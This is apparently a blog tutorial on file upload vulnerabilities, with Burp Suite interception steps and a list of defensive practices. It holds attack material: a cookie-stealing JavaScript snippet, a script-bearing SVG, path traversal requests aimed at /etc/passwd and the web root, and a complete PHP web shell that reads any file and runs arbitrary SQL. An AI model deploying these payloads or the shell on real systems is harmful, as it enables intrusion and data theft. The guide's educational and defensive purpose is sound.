---
name: 'A Security Guide with Burp Suite and Exploit Code'
description: 'Learn about common file upload vulnerabilities and how attackers exploit them using Burp Suite.'
id: a-security-guide-with-burp-suite-and-exploit-code
tags:
  - 'security'
  - 'exploit'
date: 1729467970079
---

File upload functionality is a common feature in web applications. However, if not properly secured, it can lead to dangerous vulnerabilities, potentially allowing attackers to compromise your entire system. In this article, we will explore some of the most common file upload vulnerabilities, including not just PHP-based attacks but also other file types like JavaScript, SVG, and PNG. We will demonstrate how attackers manipulate these vulnerabilities using Burp Suite and show an example of a malicious script that could be used to exploit the system. Additionally, we’ll discuss the best practices for securing your file upload functionality.

### 1. Unrestricted File Uploads (PHP, JavaScript, SVG, and PNG)
One of the most dangerous file upload vulnerabilities is allowing users to upload any file without proper restrictions. Attackers can upload various types of malicious files, including PHP, JavaScript, or even specially crafted SVG or PNG files, that can lead to Remote Code Execution (RCE), defacement, or data theft.

1. PHP Shell Upload
An attacker might upload a .php file (such as a web shell) to execute arbitrary commands on the server.

2. JavaScript File Upload
JavaScript files (e.g., .js) could be uploaded and executed by other users on a web page, leading to attacks like Cross-Site Scripting (XSS) or Remote Code Execution (RCE) in Node.js environments.

- Burp Suite Example:
	1.	Upload a .js file containing malicious JavaScript code via an insecure file upload form.
	2.	Intercept the request with Burp Suite and modify the content type or bypass client-side validation.
	3.	After the upload, the script could be included in the page and executed in the browser context of other users.
```js
// Malicious .js file content
fetch('/steal_cookies').then(response => response.json()).then(data => alert(data));
```

Once uploaded, the script could be accessed via:
```html
<script src="https://example.com/uploads/malicious.js"></script>
```

Solution: Restrict JavaScript file uploads or properly sanitize and encode file content to prevent XSS. Avoid executing user-uploaded files directly in the browser.

3. SVG File Upload
SVG (Scalable Vector Graphics) files are another potential attack vector. Because SVG files support embedded JavaScript and are rendered as XML, attackers can craft malicious SVG files that execute JavaScript when the file is viewed.

- Burp Suite Example:
	1.	Upload a crafted .svg file containing malicious JavaScript.
	2.	Use Burp Suite to bypass the MIME-type validation or filename restrictions.
	3.	Once uploaded, the SVG could execute JavaScript in the context of the browser, leading to XSS or other client-side attacks.
```xml
<!-- Malicious SVG File Content -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    alert('Hacked via SVG file!');
  </script>
</svg>
```

Solution: Sanitize SVG files using libraries like SVG-Sanitizer to remove harmful content like embedded scripts. Alternatively, disallow SVG uploads if not essential.

4. PNG File Exploit
Even seemingly harmless image formats like .png can be weaponized. Attackers can craft malicious PNG files containing payloads that target vulnerabilities in image processing libraries (such as ImageMagick or GD in PHP). These vulnerabilities can lead to remote code execution (RCE) or denial of service (DoS) attacks.
- Burp Suite Example:
	1.	Upload a malicious .png file using Burp Suite.
	2.	Trigger an RCE attack by exploiting an image processing vulnerability (e.g., ImageMagick’s CVE-2016-3714).

Solution: Keep image processing libraries up to date and use strict security policies when handling user-uploaded images. Consider using safer libraries or services to process images outside of your main application environment.

### 2. Content-Type Bypass (Various File Types)

Attackers often manipulate the Content-Type header in HTTP requests to bypass file upload restrictions. For example, they might change the content type of a PHP file to image/jpeg or a .js file to text/html to trick the server into accepting the upload.

- Burp Suite Example:
	1.	Intercept the upload request in Burp Suite.
	2.	Change the Content-Type header to bypass file type validation and upload a malicious file.
	3.	Forward the request, and if successful, the file will be stored and potentially executed.

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: image/jpeg

[FILE DATA]
```

Solution: Perform strict server-side validation of file types using both file extensions and the actual content of the file. Avoid relying solely on client-provided headers.

### 3. Path Traversal in File Uploads

Path traversal vulnerabilities occur when attackers can manipulate the file path during an upload to place a file in a different directory than intended or overwrite sensitive files.

Example:
An attacker could upload a file using a path traversal string, such as `../../../../../var/www/html/shell.php`, to place a PHP shell in the web root.

- Burp Suite Example:
	1. Intercept the upload request in Burp Suite.
	2. Modify the filename parameter to include a path traversal string.
	3. Forward the request and check if the file was uploaded to an unintended location.

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../../../etc/passwd"

[FILE DATA]
```

Solution: Sanitize filenames and file paths using functions like basename() to strip out dangerous path traversal characters. Store uploaded files in a dedicated directory with strict permissions.

##### Sample Exploit PHP Script: File Read and Database Dump

If an attacker successfully uploads a malicious file, such as a PHP web shell, they can use it to read sensitive files or dump the database contents. Below is a PHP script that demonstrates this.

```php
<?php
// Simple Web Shell with File Read and DB Dump Functionality

// Command to read any file from the server (e.g., /etc/passwd or database config file)
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    if (file_exists($file)) {
        echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
    } else {
        echo "File does not exist.";
    }
}

// Connect to the database and extract data
if (isset($_GET['db'])) {
    $host = 'localhost'; // Change if using a remote database
    $db = 'your_database_name'; // Name of the database
    $user = 'your_database_user'; // Database user
    $pass = 'your_database_password'; // Database password

    $conn = new mysqli($host, $user, $pass, $db);

    if ($conn->connect_error) {
        die("Database connection failed: " . $conn->connect_error);
    }

    $query = isset($_GET['query']) ? $_GET['query'] : 'SELECT * FROM your_table LIMIT 10';
    $result = $conn->query($query);

    if ($result->num_rows > 0) {
        while ($row = $result->fetch_assoc()) {
            echo "<pre>" . print_r($row, true) . "</pre>";
        }
    } else {
        echo "No results found.";
    }

    $conn->close();
}
?>
```

### How to Protect Against File Upload Vulnerabilities

To safeguard your web application from these types of attacks, follow these best practices:
1.	File Type Validation: Always validate the type of file being uploaded. Check both the file extension and the MIME type. Use libraries to inspect the content of the file (like mime_content_type() in PHP) and avoid trusting user-supplied values.
2.	Use File Validators: Implement strong file validation logic to allow only specific file types (e.g., images or PDFs). Tools like Symfony Validator or Laravel’s validation system allow you to enforce rules for file uploads.
3.	Limit File Sizes: Ensure that large files are rejected. Set file size limits server-side to prevent attackers from uploading excessively large files and causing a denial-of-service (DoS) attack.
4.	Use Safe Directories: Store uploaded files in a directory outside of your web root. If files don’t need to be accessed via the web server, this reduces the risk of attackers accessing or executing them.
5.	Sanitize Filenames: Prevent path traversal attacks by sanitizing file paths and filenames using functions like basename() to avoid directory traversal.
6.	Set Proper File Permissions: Ensure that the directory where files are uploaded has restricted permissions. Uploaded files should not have execute permissions (chmod 644), which prevents execution of malicious scripts.
7.	Disable Script Execution in Upload Directory: Use a .htaccess file to disable PHP or other script execution in the upload directory.
8.	Sanitize SVGs: Use tools like SVG-Sanitizer to clean SVG files from potentially harmful embedded scripts.
9.	Use Antivirus/Antimalware: Implement an additional layer of protection by scanning uploaded files for known malware signatures using tools like ClamAV.
10.	Keep Software Updated: Regularly update your web server software, image processing libraries, and other components to patch known vulnerabilities.

By following these best practices and understanding the risks associated with file uploads, you can better secure your web application from various attack vectors.